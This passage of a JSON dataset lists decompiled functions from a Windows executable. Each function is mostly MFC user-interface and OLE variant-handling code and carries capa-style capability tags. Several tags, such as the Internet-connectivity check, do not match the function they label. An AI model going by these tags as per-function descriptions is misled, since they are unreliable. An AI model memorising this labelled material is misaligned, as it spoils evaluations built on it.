4)) {\n                        fcn.0042b9a2(iVar8, iVar2);\n                        break;\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < iVar3);\n            }\n        }\n        var_ch = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n        pcVar1 = _sym.imp.USER32.dll_GetMenuItemID;\n        var_24h = 0;\n        if (var_ch != 0) {\n            do {\n                uVar6 = var_24h;\n                var_28h = (*pcVar1)(*(arg_8h + 4), var_24h);\n                uVar5 = var_ch;\n                if (var_28h != 0) {\n                    if (var_28h == 0xffffffff) {\n                        iVar2 = fcn.0041cdc9(uVar6, var_24h);\n                        if (((iVar2 == 0) || (var_28h = (*pcVar1)(*(iVar2 + 4), 0),  var_28h == 0)) ||\n                           (var_28h == 0xffffffff)) goto code_r0x00446bf9;\n                        arg_ch_00 = 0;\n                    }\n                    else if ((*(in_ECX + 0x54) == 0) || (0xefff < var_28h)) {\n                        arg_ch_00 = 0;\n                    }\n                    else {\n                        arg_ch_00 = 1;\n                    }\n                    fcn.00421fb4(in_ECX, arg_ch_00);\n                    uVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n                    if (uVar5 < var_ch) {\n                        var_24h = var_24h + (uVar5 - var_ch);\n                        while ((var_24h < uVar5 && (uVar6 = (*pcVar1)(*(arg_8h + 4), var_24h),  uVar6 == var_28h))) {\n                            var_24h = var_24h + 1;\n                        }\n                    }\n                }\ncode_r0x00446bf9:\n                var_ch = uVar5;\n                var_24h = var_24h + 1;\n            } while (var_24h < var_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 1008
    },
    "00446c0f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446c0f(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    \n    iVar1 = fcn.0041f23b();\n    if (iVar1 == 0) {\n        fcn.0041901a();\n    }\n    if ((in_ECX[0x20] != NULL) && (iVar2 = (**(*in_ECX[0x20] + 0x7c))(arg_8h, arg_ch, arg_10h),  iVar2 != 0)) {\n        return;\n    }\n    if (arg_ch == 0xffff) {\n        in_ECX[0xf] = in_ECX[0xf] & 0xffffffbf;\n        if (*(iVar1 + 0x68) == 0) {\n            in_ECX[0x2a] = 0xe001;\n        }\n        else {\n            in_ECX[0x2a] = 0xe002;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], 0x362, in_ECX[0x2a], 0);\n        iVar1 = (**(*in_ECX + 0x154))();\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(*(iVar1 + 0x20));\n        }\n        goto code_r0x00446cef;\n    }\n    if ((arg_8h == 0) || ((arg_ch & 0x810) != 0)) {\n        in_ECX[0x2a] = 0;\n    }\n    else {\n        if (arg_8h - 0xf000 < 0x1f0) {\n            arg_8h = (arg_8h - 0xf000 >> 4) + 0xef00;\n        }\n        else if (0xfeff < arg_8h) {\n            in_ECX[0x2a] = 0xef1f;\n            goto code_r0x00446ceb;\n        }\n        in_ECX[0x2a] = arg_8h;\n    }\ncode_r0x00446ceb:\n    *(iVar1 + 0x3c) = *(iVar1 + 0x3c) | 0x40;\ncode_r0x00446cef:\n    if (in_ECX[0x2a] != in_ECX[0x2b]) {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[8]);\n        iVar1 = fcn.0041e67e(uVar3);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_PostMessageA)(in_ECX[8], 0x36a, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 649
    },
    "00446d8a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00446d8a(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        iVar1 = 0;\n    }\n    else {\n        var_4h = *(in_ECX + 0x88);\n        do {\n            if (var_4h == 0) {\n                return 0;\n            }\n            piVar2 = fcn.0041c771(&var_4h);\n            iVar1 = *piVar2;\n            uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(iVar1 + 0x20));\n        } while ((uVar3 & 0xffff) != arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 206
    },
    "004474fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004474fd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar2 = fcn.00436335(param_1 + 0x14, *(param_1 + 0x18));\n        iVar1 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0041901a();\n    }\n    *(param_1 + 0x10) = *puVar3;\n    puVar3[1] = uStack8;\n    *puVar3 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    return;\n}\n",
        "token_count": 316
    },
    "004475e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004475e1(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x3c) == 0) {\n        uVar1 = fcn.0041e3b1(\"ImageList_Draw\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x3c) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x3c);\n    return;\n}\n",
        "token_count": 130
    },
    "0044768f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0044768f(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "004476c5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004476c5(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0x9c;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.0041e3b1(\"ImageList_GetImageInfo\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 143
    },
    "0044776e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0044776e(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00447c3f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00447c3f(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack24;\n    uint var_10h;\n    int32_t iStack16;\n    int32_t iStack12;\n    uint var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x3c;\n    var_4h = 0x447c4b;\n    fcn.00458e45();\n    var_4h = 10;\n    iStack12 = 0x447c57;\n    fcn.00447491();\n    *(unaff_EBP + -4) = 0;\n    iStack12 = 10;\n    iStack16 = 0x447c65;\n    fcn.00447491();\n    iVar1 = *(extraout_ECX + 0x88);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x10) = iVar1;\n    while (iVar1 != 0) {\n        iStack16 = unaff_EBP + -0x10;\n        var_10h = 0x447c87;\n        ppiVar3 = fcn.0041c771();\n        piVar4 = *ppiVar3;\n        var_10h = 0x447c93;\n        (**(*piVar4 + 0x15c))();\n        iStack12 = piVar4[8];\n        iStack16 = 0x447ca5;\n        fcn.00447abc();\n        iVar1 = *(unaff_EBP + -0x10);\n    }\n    puVar5 = *(unaff_EBP + -0x44);\n    while( true ) {\n        while( true ) {\n            do {\n                if (puVar5 == NULL) {\n                    puVar5 = *(unaff_EBP + -0x28);\n                    while (puVar5 != NULL) {\n                        iStack12 = puVar5[2];\n                        puVar5 = *puVar5;\n                        var_10h = 0x447d09;\n                        var_10h = fcn.0041e6a5();\n                        uStack24 = 0x48fc28;\n                        piVar4 = fcn.004306fe();\n                        if (piVar4 != NULL) {\n                            var_10h = 0x447d21;\n                            (**(*piVar4 + 0x60))();\n                        }\n                    }\n                    *(unaff_EBP + -4) = 0;\n                    *(unaff_EBP + -0x2c) = vtable.CList_struct_HWND_____struct_HWND____.0;\n                    iStack16 = 0x447d39;\n                    fcn.00445bc9();\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    *(unaff_EBP + -0x48) = vtable.CList_struct_HWND_____struct_HWND____.0;\n                    iStack16 = 0x447d48;\n                    fcn.00445bc9();\n                    iStack16 = 0x447d4d;\n                    fcn.00458f1d();\n                    return;\n                }\n                iStack12 = puVar5[2];\n                puVar5 = *puVar5;\n                var_10h = 0x447cbc;\n                var_10h = fcn.0041e6a5();\n                uStack24 = 0x4905c8;\n                piVar4 = fcn.004306fe();\n            } while (piVar4 == NULL);\n            if (piVar4[0x25] != 0) break;\n            var_10h = 0x447cef;\n            (**(*piVar4 + 0x60))();\n        }\n        var_10h = 0x447cdd;\n        piVar4 = fcn.0041f1fc();\n        if (piVar4 == NULL) break;\n        var_10h = 0x447ce8;\n        (**(*piVar4 + 0x60))();\n    }\n    uStack24 = 0x4a8690;\n    fcn.00456b8d(&stack0xffffffe8, 0x49ed44);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1031
    },
    "00448bb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00448bb9(uint arg_8h, int32_t lpFileTime)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack36;\n    uint lpSystemTime;\n    uint var_12h;\n    ushort var_eh;\n    ushort var_ch;\n    uint var_ah;\n    \n    if (lpFileTime == 0) {\n        iStack36 = 0x4a8690;\n        fcn.00456b8d(&stack0xffffffdc, 0x49ed44);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iStack36 = 0x448bd5;\n    lpSystemTime._0_2_ = fcn.0040ead0();\n    iStack36 = 0x448be0;\n    lpSystemTime._2_2_ = fcn.0040eb00();\n    iStack36 = 0x448beb;\n    var_12h._0_2_ = fcn.0040eb40();\n    iStack36 = 0x448bf6;\n    var_12h._2_2_ = fcn.0040eb60();\n    iStack36 = 0x448c01;\n    var_eh = fcn.0040eb90();\n    iStack36 = 0x448c0c;\n    var_ch = fcn.0040ebc0();\n    var_ah._0_2_ = 0;\n    iStack36 = &fcn.00448bb9::var_ah + 2;\n    iVar2 = (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&fcn.00448bb9::lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(0);\n        fcn.0044558c(uVar3);\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalFileTimeToFileTime)(&fcn.00448bb9::var_ah + 2, lpFileTime);\n    if (iVar2 == 0) {\n        uVar3 = (*pcVar1)(0);\n        fcn.0044558c(uVar3);\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "004492eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004492eb(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    ulong *arg_8h_00;\n    int16_t *piVar5;\n    uint pvargDest;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_4h;\n    \n    fcn.00458e45(0x20);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    var_4h = unaff_EBP + -0x2c;\n    *(unaff_EBP + -0x10) = 0;\n    fcn.0043376f(var_4h);\n    iVar2 = *(unaff_EBP + 8);\n    piVar5 = **(unaff_EBP + 0xc);\n    iVar1 = *(iVar2 + 0xc);\n    if ((iVar1 != 0xc) && (*piVar5 != iVar1)) {\n        iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(unaff_EBP + -0x2c, piVar5, 0, iVar1);\n        *(unaff_EBP + -0x10) = iVar3;\n        if (iVar3 < 0) {\n            **(unaff_EBP + 0x10) = 0;\n            goto code_r0x00449414;\n        }\n        piVar5 = unaff_EBP + -0x2c;\n    }\n    arg_8h_00 = *(iVar2 + 0x18) + *(unaff_EBP + -0x14);\n    // switch table (20 cases) at 0x44941f\n    switch(*(iVar2 + 0xc)) {\n    case 2:\n    case 0x12:\n        *arg_8h_00 = piVar5[4];\n        break;\n    case 4:\n        *arg_8h_00 = *(piVar5 + 4);\n        break;\n    case 5:\n    case 7:\n        *arg_8h_00 = *(piVar5 + 4);\n        break;\n    case 6:\n    case 0x14:\n    case 0x15:\n        *arg_8h_00 = *(piVar5 + 4);\n        *(arg_8h_00 + 4) = *(piVar5 + 6);\n        break;\n    case 8:\n        fcn.00430adc(arg_8h_00, *(piVar5 + 4));\n        break;\n    case 9:\n    case 0xd:\n        if (*(piVar5 + 4) != 0) {\n            (**(**(piVar5 + 4) + 4))(*(piVar5 + 4));\n        }\n        fcn.00430b55(arg_8h_00);\n    case 3:\n    case 10:\n    case 0x13:\n        uVar4 = *(piVar5 + 4);\n        goto code_r0x0044936c;\n    case 0xb:\n        uVar4 = piVar5[4] != 0;\ncode_r0x0044936c:\n        *arg_8h_00 = uVar4;\n        break;\n    case 0xc:\n        iVar3 = (*_sym.imp.OLEAUT32.dll_VariantCopyInd)(arg_8h_00, piVar5);\n        if (iVar3 != 0) goto code_r0x004493cd;\n        break;\n    default:\n        *(unaff_EBP + -0x10) = 0x80020008;\ncode_r0x004493cd:\n        **(unaff_EBP + 0x10) = 0;\n        break;\n    case 0x10:\n    case 0x11:\n        *arg_8h_00 = *(piVar5 + 4);\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x2c);\n    if ((-1 < *(unaff_EBP + -0x10)) && (*(iVar2 + 0x14) != 0)) {\n        fcn.0042b84e(*(*(unaff_EBP + -0x14) + 0x1c));\n        *(unaff_EBP + -4) = 0;\n        (**(iVar2 + 0x14))();\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x18) != 0) {\n            var_4h = 0;\n            fcn.0042abcb();\n        }\n    }\ncode_r0x00449414:\n    fcn.00458f1d(var_4h);\n    return;\n}\n",
        "token_count": 1151
    },
    "0044986e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044986e(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (param_1 != param_2) {\n        uVar1 = *param_2;\n        if (param_2[2] != 0) {\n            *param_2 = 0;\n        }\n        *param_1 = uVar1;\n        param_1[1] = param_2[1];\n        param_1[2] = param_2[2];\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00449894": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449894(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    uint uStack28;\n    \n    iVar5 = 0;\n    if (0 < *(param_1 + 8)) {\n        do {\n            piVar2 = fcn.00449254();\n            if ((*piVar2 == 0) || (iVar3 = fcn.00449254(),  *(iVar3 + 4) == 0)) {\n                uStack28 = 0x4a8690;\n                fcn.00456b8d(&stack0xffffffe4, 0x49ed44);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uStack28 = 0x4498c3;\n            ppiVar4 = fcn.00449254();\n            iVar3 = fcn.00449254();\n            iVar5 = iVar5 + 1;\n            **(iVar3 + 4) = -(**ppiVar4 != 0);\n        } while (iVar5 < *(param_1 + 8));\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "004498ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004498ea(code **param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const__.0;\n    if (param_1[1] != NULL) {\n        iVar1 = 0;\n        if (0 < param_1[2]) {\n            do {\n                fcn.004492c6();\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < param_1[2]);\n        }\n        fcn.004170df(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00449b49": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00449b49(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint extraout_ECX;\n    int32_t iVar10;\n    int16_t *piVar11;\n    int32_t unaff_EBP;\n    ulong *puVar12;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x18);\n    puVar9 = *(unaff_EBP + 8);\n    *puVar9 = extraout_ECX;\n    puVar12 = puVar9 + 1;\n    if ((*(unaff_EBP + 0x14) == 6) || (*(unaff_EBP + 0x14) == 0xc)) {\n        *puVar12 = *(unaff_EBP + 0x10);\n        puVar12 = puVar9 + 2;\n    }\n    puVar9 = *(unaff_EBP + 0x18);\n    uVar8 = *puVar9;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = uVar8;\n    *(unaff_EBP + 8) = puVar9[2];\n    *(unaff_EBP + -0x10) = puVar9[3];\n    cVar2 = **(unaff_EBP + 0xc);\n    *(unaff_EBP + 0x10) = *(unaff_EBP + 0xc);\n    if (cVar2 != '\\0') {\n        do {\n            uVar3 = **(unaff_EBP + 0x10);\n            uVar6 = uVar3;\n            iVar10 = *(unaff_EBP + 8) + -1;\n            *(unaff_EBP + 8) = iVar10;\n            *(unaff_EBP + 0x14) = uVar6;\n            if ((uVar3 != 0xff) && ((uVar3 & 0x40) != 0)) {\n                uVar6 = uVar6 & 0xffffffbf | 0x4000;\n                *(unaff_EBP + 0x14) = uVar6;\n            }\n            iVar5 = uVar6;\n            if (iVar10 < *(unaff_EBP + -0x10)) {\n                if (iVar5 == 0xff) {\n                    uVar8 = *(*(unaff_EBP + 0x18) + 0xc);\n                    *(unaff_EBP + -0x10) = 0;\n                    *(unaff_EBP + 8) = uVar8;\n                    *(unaff_EBP + -0x14) = 1;\n                    goto code_r0x00449d99;\n                }\n                if ((*(unaff_EBP + -0x14) == 0) && (iVar5 == 0xc)) {\n                    *0x4ad4a8 = 10;\n                    *0x4ad4b0 = 0x80020004;\n                    piVar11 = 0x4ad4a8;\n                    goto code_r0x00449cc3;\n                }\n                break;\n            }\n            if (iVar5 == 0xff) break;\n            piVar1 = iVar10 * 0x10 + *(unaff_EBP + -0x18);\n            piVar11 = piVar1;\n            if ((iVar5 != 0xc) && (iVar4 = *piVar1,  iVar5 != iVar4)) {\n                piVar11 = iVar10 * 0x10 + *(unaff_EBP + 0x20);\n                if (iVar5 == 0xe) {\n                    *(unaff_EBP + 0xc) = 8;\n                }\n                else {\n                    *(unaff_EBP + 0xc) = uVar6;\n                }\n                if (iVar4 != *(unaff_EBP + 0xc)) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(piVar11, piVar1, 0, *(unaff_EBP + 0xc));\n                    if (iVar10 < 0) goto code_r0x00449db6;\n                    uVar6 = *(unaff_EBP + 0x14);\n                }\n                if (uVar6 == 0xe) {\n                    if (*piVar1 == *(unaff_EBP + 0xc)) {\n                        uVar8 = fcn.00430790(*(piVar1 + 4));\n                        *(piVar11 + 4) = uVar8;\n                        *piVar11 = 8;\n                    }\n                    else {\n                        uVar8 = *(piVar11 + 4);\n                        uVar7 = fcn.00430790(uVar8);\n                        *(piVar11 + 4) = uVar7;\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar8);\n                    }\n                    *(unaff_EBP + 0x14) = 8;\n                    uVar6 = *(unaff_EBP + 0x14);\n                }\n            }\ncode_r0x00449cc3:\n            if ((uVar6 & 0x4000) != 0) {\n                if ((uVar6 == 0x400b) && (iVar10 = *(unaff_EBP + 0x24),  iVar10 != 0)) {\n                    *(unaff_EBP + 0x14) = **(piVar11 + 4) != 0;\n                    puVar9 = fcn.004170b4(4);\n                    if (puVar9 == NULL) {\n                        *(unaff_EBP + 0x14) = 0;\n                    }\n                    else {\n                        *puVar9 = *(unaff_EBP + 0x14);\n                        *(unaff_EBP + 0x14) = puVar9;\n                    }\n                    uVar7 = fcn.0044927a(*(unaff_EBP + 0x14), *(piVar11 + 4), 1);\n                    uVar8 = *(iVar10 + 8);\n                    *(unaff_EBP + -4) = 0;\n                    fcn.004499b4(uVar8, uVar7);\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x1c) != 0) {\n                        fcn.004170df(*(unaff_EBP + -0x24));\n                    }\n                    piVar11 = *(unaff_EBP + 0x14);\n                }\n                else {\n                    piVar11 = *(piVar11 + 4);\n                }\ncode_r0x00449d3b:\n                *puVar12 = piVar11;\n                goto code_r0x00449d97;\n            }\n    // switch table (20 cases) at 0x449de1\n            switch(uVar6 & 0xffff) {\n            case 2:\n                uVar6 = piVar11[4];\n                break;\n            case 3:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0x13:\n                uVar6 = *(piVar11 + 4);\n                break;\n            case 4:\n                *puVar12 = *(piVar11 + 4);\n                goto code_r0x00449d97;\n            case 5:\n            case 7:\n                *puVar12 = *(piVar11 + 4);\n                goto code_r0x00449d74;\n            case 6:\n            case 0x14:\n            case 0x15:\n                *puVar12 = *(piVar11 + 4);\n                *(puVar12 + 4) = *(piVar11 + 6);\ncode_r0x00449d74:\n                puVar12 = puVar12 + 1;\n                goto code_r0x00449d99;\n            case 0xb:\n                uVar6 = piVar11[4] != 0;\n                break;\n            case 0xc:\n                goto code_r0x00449d3b;\n            default:\n                goto code_r0x00449d99;\n            case 0x10:\n                uVar6 = *(piVar11 + 4);\n                break;\n            case 0x11:\n                uVar6 = *(piVar11 + 4);\n                break;\n            case 0x12:\n                uVar6 = piVar11[4];\n            }\n            *puVar12 = uVar6;\ncode_r0x00449d97:\n            puVar12 = puVar12 + 4;\ncode_r0x00449d99:\n            *(unaff_EBP + 0x10) = *(unaff_EBP + 0x10) + 1;\n        } while (**(unaff_EBP + 0x10) != '\\0');\n        puVar9 = *(unaff_EBP + 0x18);\n    }\n    if (*(unaff_EBP + 8) < 1) {\n        if (**(unaff_EBP + 0x10) != '\\0') {\n            **(unaff_EBP + 0x1c) = puVar9[2];\n        }\n    }\n    else {\ncode_r0x00449db6:\n        **(unaff_EBP + 0x1c) = *(unaff_EBP + 8);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 2254
    },
    "00449e31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Variable defined which should be unmapped: var_34h_2\n// WARNING: Variable defined which should be unmapped: var_30h_3\n// WARNING: Variable defined which should be unmapped: var_2ch_3\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_2ch_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: pvargDest\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00449e31(uint noname_0, uint arg_14h_2, uint arg_18h, uint arg_8h, uint arg_ch, uint noname_5, uint arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t 